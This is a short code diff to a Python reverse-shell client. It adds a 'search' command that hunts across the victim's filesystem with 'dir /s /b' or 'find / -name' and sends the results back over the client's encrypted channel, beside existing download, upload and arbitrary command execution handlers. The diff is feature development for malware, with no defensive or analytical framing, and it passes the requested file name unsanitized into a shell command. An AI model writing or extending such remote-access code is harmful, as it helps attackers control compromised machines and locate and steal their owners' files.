@@ -49,6 +49,8 @@ class ReverseShellClient:
                     self.handle_download(decrypted_data)
                 elif decrypted_data.startswith("upload"):
                     self.handle_upload(decrypted_data)
+                elif decrypted_data.startswith("search"):
+                    self.handle_search(decrypted_data)
                 else:
                     self.execute_command(decrypted_data)
         finally:
@@ -88,6 +90,15 @@ class ReverseShellClient:
         except Exception as e:
             print(f"Failed to upload {file_path}: {e}")
             self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
+
+    def handle_search(self, command):
+        file_name = command.split(" ", 1)[1]
+        if os.name == "nt":
+            command = f"dir /s /b {file_name}"
+        else:
+            command = f"find / -name {file_name} 2>/dev/null"
+        result = self.run_system_command(command)
+        self.send_large_data(result)
 
     def execute_command(self, command):
         try:
